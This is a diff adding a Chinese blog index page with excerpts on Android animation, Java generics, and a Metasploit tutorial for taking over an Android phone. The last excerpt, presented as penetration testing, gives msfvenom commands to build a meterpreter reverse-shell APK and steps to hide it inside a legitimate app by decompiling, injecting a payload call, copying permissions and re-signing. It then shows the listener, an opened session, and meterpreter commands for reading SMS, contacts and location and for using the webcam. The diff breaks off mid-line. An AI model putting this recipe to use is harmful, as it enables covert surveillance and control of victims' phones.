@@ -154,6 +154,431 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-Android动画插值器" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/16/Android%E5%8A%A8%E7%94%BB%E6%8F%92%E5%80%BC%E5%99%A8/">Android动画插值器Interpolator</a>
+    </h1>
+  
+
+        
+        <a href="/2021/09/16/Android%E5%8A%A8%E7%94%BB%E6%8F%92%E5%80%BC%E5%99%A8/" class="archive-article-date">
+  	<time datetime="2021-09-16T10:23:47.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-09-16</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><h4 id="Android常见的三种动画"><a href="#Android常见的三种动画" class="headerlink" title="Android常见的三种动画"></a>Android常见的三种动画</h4><h5 id="视图动画之帧动画"><a href="#视图动画之帧动画" class="headerlink" title="视图动画之帧动画"></a>视图动画之帧动画</h5><p>帧动画是顺序播放一组预先定义好的图片，类似于电影播放。不同于View动画，系统提供了另外一个类AnimationDrawable来使用帧动画。帧动画的使用比较简单，首先需要通过XML来定义一个AnimationDrawable</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; res&#x2F;drawable&#x2F;frame_animation.xml</span><br><span class="line">&lt;? xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;? &gt;</span><br><span class="line">&lt;animation-list xmlns:android&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res&#x2F;android&quot;</span><br><span class="line">    android:oneshot&#x3D;&quot;false&quot;&gt;</span><br><span class="line">    &lt;item android:drawable&#x3D;&quot;@drawable&#x2F;image1&quot; android:duration&#x3D;&quot;500&quot; &#x2F;&gt;</span><br><span class="line">    &lt;item android:drawable&#x3D;&quot;@drawable&#x2F;image2&quot; android:duration&#x3D;&quot;500&quot; &#x2F;&gt;</span><br><span class="line">    &lt;item android:drawable&#x3D;&quot;@drawable&#x2F;image3&quot; android:duration&#x3D;&quot;500&quot; &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;animation-list&gt;</span><br></pre></td></tr></table></figure>
+        
+          <a class="article-more-a" href="/2021/09/16/Android%E5%8A%A8%E7%94%BB%E6%8F%92%E5%80%BC%E5%99%A8/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">动画</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2021/09/16/Android%E5%8A%A8%E7%94%BB%E6%8F%92%E5%80%BC%E5%99%A8/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-重学泛型" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/12/28/%E9%87%8D%E5%AD%A6%E6%B3%9B%E5%9E%8B/">重学泛型</a>
+    </h1>
+  
+
+        
+        <a href="/2020/12/28/%E9%87%8D%E5%AD%A6%E6%B3%9B%E5%9E%8B/" class="archive-article-date">
+  	<time datetime="2020-12-27T17:12:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-12-28</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="什么是泛型？"><a href="#什么是泛型？" class="headerlink" title="什么是泛型？"></a>什么是泛型？</h2><ul>
+<li><p>Java泛型(generics)是JDK5中引入的一种<strong>参数化类型</strong>特性</p>
+</li>
+<li><p>Java泛型(generics)是JDK5中引入的一个新特性，泛型提供了<br>编译时类型安全检测机制，<br>该机制允许程序员在编译时检测到非法的类型<br>泛型的本质是参数类型，也就是说所操作的数据类型被指定为一个参数<br>泛型不存在于JVM虚拟机</p>
+</li>
+</ul>
+<h2 id="什么是参数化类型？"><a href="#什么是参数化类型？" class="headerlink" title="什么是参数化类型？"></a>什么是参数化类型？</h2><p>把类型当参数一样传递</p>
+<p>数据类型只能是引用类型（泛型的副作用）</p>
+<p>举个例子：</p>
+<ul>
+<li><p>List<T>中的”T”称为<strong>类型参数</strong></p>
+</li>
+<li><p>List<Person>中的”Person”称为<strong>实际类型参数</strong></p>
+</li>
+<li><p>“List<T>“整个成为<strong>泛型类型</strong></p>
+</li>
+<li><p>“List<Person>“整个称为<strong>参数化的类型ParameterizedType</strong></p>
+        
+          <a class="article-more-a" href="/2020/12/28/%E9%87%8D%E5%AD%A6%E6%B3%9B%E5%9E%8B/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">Java</a>
+        		</li>
+      		 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">泛型</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2020/12/28/%E9%87%8D%E5%AD%A6%E6%B3%9B%E5%9E%8B/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-应用MSF域内渗透检测Android手机" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h3 id="安装msf"><a href="#安装msf" class="headerlink" title="安装msf"></a>安装msf</h3><p>是什么？Metasploit Framework</p>
+<p>什么是Metasploit？</p>
+<p>简单来说：全球最常用的渗透测试框架，ruby语言写的</p>
+<p>Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。</p>
+<p><strong>验证漏洞开源的工具</strong></p>
+<p>官网：<a target="_blank" rel="noopener" href="https://www.metasploit.com/">https://www.metasploit.com/</a></p>
+<p>github:<a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers">https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers</a></p>
+<p>如果是mac环境，直接在命令行中输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &gt; msfinstall &amp;&amp; \</span><br><span class="line">  chmod 755 msfinstall &amp;&amp; \</span><br><span class="line">  .&#x2F;msfinstall</span><br></pre></td></tr></table></figure>
+<p>等待结果是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"># laibinzhi @ laibinzhideMacBook-Pro in ~ [19:13:23]</span><br><span class="line">$ curl https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;rapid7&#x2F;metasploit-omnibus&#x2F;master&#x2F;config&#x2F;templates&#x2F;metasploit-framework-wrappers&#x2F;msfupdate.erb &gt; msfinstall &amp;&amp; \</span><br><span class="line">  chmod 755 msfinstall &amp;&amp; \</span><br><span class="line">  .&#x2F;msfinstall</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  5922  100  5922    0     0  11939      0 --:--:-- --:--:-- --:--:-- 11915</span><br><span class="line">Switching to root user to update the package</span><br><span class="line">Password:</span><br><span class="line">Downloading package...</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line"> 58  207M   58  120M    0     0  3225k      0  0:01:05  0:00:38  0:00:27 3468k</span><br><span class="line">curl: (18) transfer closed with 90925034 bytes remaining to read</span><br><span class="line">Checking signature...</span><br><span class="line">Package &quot;metasploitframework-latest.pkg&quot;:</span><br><span class="line">   Status: package is invalid (checksum did not verify)</span><br><span class="line">Cleaning up...</span><br><span class="line">metasploitframework-latest.pkg</span><br></pre></td></tr></table></figure>
+<p>在zsh配置文件下配置msf路径的环境变量，方便直接调用msf路径</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vim ~&#x2F;.zshrc</span><br><span class="line">export PATH&#x3D;&quot;$PATH:&#x2F;opt&#x2F;metasploit-framework&#x2F;bin&quot;</span><br></pre></td></tr></table></figure>
+<h3 id="启用msf"><a href="#启用msf" class="headerlink" title="启用msf"></a>启用msf</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ msfconsole</span><br></pre></td></tr></table></figure>
+<p>如果是第一次使用，在输入上面命令的时候，会提示初始化一个数据库，选择y</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Would you like to use and setup a new database (recommended)? y</span><br></pre></td></tr></table></figure>
+<p>然后设置用户名和密码，这里都设置为msf</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[?] Initial MSF web service account username? [opposec]: msf</span><br><span class="line">[?] Initial MSF web service account password? (Leave blank for random password): msf</span><br></pre></td></tr></table></figure>
+<p>然后提示创建成功</p>
+<p>在浏览器打开 <a target="_blank" rel="noopener" href="https://localhost:5443/api/v1/auth/account">https://localhost:5443/api/v1/auth/account</a></p>
+<p><img src="http://lbz-blog.test.upcdn.net/post/%E6%88%AA%E5%B1%8F2020-09-17%E4%B8%8B%E5%8D%887.25.27.png" alt="image"></p>
+<p>输入刚刚的用户名密码，登录进去。</p>
+<h3 id="制作木马程序"><a href="#制作木马程序" class="headerlink" title="制作木马程序"></a>制作木马程序</h3><p>使用msfvenom工具来创建有效载荷APK文件（木马）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ msfvenom -p android&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;10.0.0.101 LPORT&#x3D;5555 R &gt; &#x2F;Users&#x2F;laibinzhi&#x2F;temp&#x2F;msf&#x2F;mua.apk</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload</span><br><span class="line">[-] No arch selected, selecting arch: dalvik from the payload</span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 10179 bytes</span><br></pre></td></tr></table></figure>
+<p>注意：</p>
+<ul>
+<li><p>10.0.0.101 是电脑的ip地址，可以通过下面命令行获取</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig | grep &quot;inet&quot;</span><br></pre></td></tr></table></figure>
+<p><img src="http://lbz-blog.test.upcdn.net/post/%E6%9C%A8%E9%A9%AC-%E8%8E%B7%E5%8F%96ip%E5%9C%B0%E5%9D%80" alt="image"></p>
+</li>
+<li><p>端口号5555，使用这个就好</p>
+</li>
+<li><p>后面输出的是apk后缀的木马文件</p>
+</li>
+</ul>
+<h3 id="安装木马程序"><a href="#安装木马程序" class="headerlink" title="安装木马程序"></a>安装木马程序</h3><p>本例子使用最简单的方式安装到手机上，安装成功后，他出现在桌面上，只有一个图标。如果是常见的就是把它反编译，把它注入到现有app中，这样就比较隐秘。</p>
+<h3 id="反编译注入"><a href="#反编译注入" class="headerlink" title="反编译注入"></a>反编译注入</h3><ol>
+<li><p>反编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apktool d normal.apk</span><br><span class="line">apktool d mua.apk</span><br></pre></td></tr></table></figure></li>
+<li><p>在目标MainActivityOnCreate插入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">invoke-static &#123;p0&#125;, Lcom&#x2F;metasploit&#x2F;stage&#x2F;Payload;-&gt;start(Landroid&#x2F;content&#x2F;Context;)V</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
+<li><p>将木马mua文件夹中的metasploit整个目录放到目标文件下com下</p>
+</li>
+<li><p>把木马AndroidManifest文件的所有权限复制到目标的AndroidManifest中</p>
+</li>
+<li><p>重新构建apk</p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apktool b normal -o new.apk</span><br></pre></td></tr></table></figure>
+<p>6.签名</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jarsigner -verbose -keystore ~&#x2F;.android&#x2F;debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA  new.apk  androiddebugkey</span><br></pre></td></tr></table></figure>
+
+<h3 id="监听手机"><a href="#监听手机" class="headerlink" title="监听手机"></a>监听手机</h3><p>以此输入下列命令，比较注意的是这些参数的值跟之前msfvenom使用的参数一样。url和端口号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F;加载模块</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">&#x2F;&#x2F;选择Payload</span><br><span class="line">set payload android&#x2F;meterpreter&#x2F;reverse_tcp </span><br><span class="line">&#x2F;&#x2F;查看参数设置</span><br><span class="line">show options </span><br><span class="line">set LHOST 10.0.0.101</span><br><span class="line">set LPORT 5555</span><br><span class="line">show options </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="http://lbz-blog.test.upcdn.net/post/%E6%9C%A8%E9%A9%AC-%E8%BE%93%E5%85%A5%E5%8F%82%E6%95%B0.png" alt="image"></p>
+<p>最后执行下面命令正在监听</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi&#x2F;handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.0.101:5555</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这里表示一致在监听，如果现在用户点击了那个木马程序，那么就会建立一个meterpreter连接。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(multi&#x2F;handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.0.0.101:5555</span><br><span class="line">[*] Sending stage (76767 bytes) to 10.0.0.15</span><br><span class="line">[*] Meterpreter session 1 opened (10.0.0.101:5555 -&gt; 10.0.0.15:44292) at 2020-09-17 19:47:25 +0800</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure>
+<p>建立连接之后，我们就可以实现电脑控制手机了,下面就是一些常见的命令行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    get_timeouts              Get the current session timeout values</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    set_timeouts              Set the current session timeout values</span><br><span class="line">    sleep                     Force Meterpreter to go quiet, then re-establish session.</span><br><span class="line">    transport                 Change the current transport mechanism</span><br><span class="line">    use                       Deprecated alias for &quot;load&quot;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    cd            Change directory</span><br><span class="line">    checksum      Retrieve the checksum of a file</span><br><span class="line">    cp            Copy source to destination</span><br><span class="line">    del           Delete the specified file</span><br><span class="line">    dir           List files (alias for ls)</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    getwd         Print working directory</span><br><span class="line">    lcd           Change local working directory</span><br><span class="line">    lls           List local files</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    ls            List files</span><br><span class="line">    mkdir         Make directory</span><br><span class="line">    mv            Move source to destination</span><br><span class="line">    pwd           Print working directory</span><br><span class="line">    rm            Delete the specified file</span><br><span class="line">    rmdir         Remove directory</span><br><span class="line">    search        Search for files</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ifconfig      Display interfaces</span><br><span class="line">    ipconfig      Display interfaces</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line">    route         View and modify the routing table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: System Commands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    execute       Execute a command</span><br><span class="line">    getuid        Get the user that the server is running as</span><br><span class="line">    localtime     Displays the target system local date and time</span><br><span class="line">    pgrep         Filter processes by name</span><br><span class="line">    ps            List running processes</span><br><span class="line">    shell         Drop into a system command shell</span><br><span class="line">    sysinfo       Gets information about the remote system, such as OS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: User interface Commands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    screenshare   Watch the remote user desktop in real time</span><br><span class="line">    screenshot    Grab a screenshot of the interactive desktop</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Webcam Commands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Command        Description</span><br><span class="line">    -------        -----------</span><br><span class="line">    record_mic     Record audio from the default microphone for X seconds</span><br><span class="line">    webcam_chat    Start a video chat</span><br><span class="line">    webcam_list    List webcams</span><br><span class="line">    webcam_snap    Take a snapshot from the specified webcam</span><br><span class="line">    webcam_stream  Play a video stream from the specified webcam</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Audio Output Commands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    play          play a waveform audio file (.wav) on the target system</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Android Commands</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">    Command           Description</span><br><span class="line">    -------           -----------</span><br><span class="line">    activity_start    Start an Android activity from a Uri string</span><br><span class="line">    check_root        Check if device is rooted</span><br><span class="line">    dump_calllog      Get call log</span><br><span class="line">    dump_contacts     Get contacts list</span><br><span class="line">    dump_sms          Get sms messages</span><br><span class="line">    geolocate         Get current lat-long using geolocation</span><br><span class="line">    hide_app_icon     Hide the app icon from the launcher</span><br><span class="line">    interval_collect  Manage interval collection capabilities</span><br><span class="line">    send_sms          Sends SMS from target session</span><br><span class="line">    set_audio_mode    Set Ringer Mode</span><br><span class="line">    sqlite_query      Query a SQLite database from storage</span><br><span class="line">    wakelock          Enable&#x2F;Disable Wakelock</span><br><span class="line">    wlan_geolocate    Get current lat-long using WLAN information</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Application Controller Commands</span><br><span 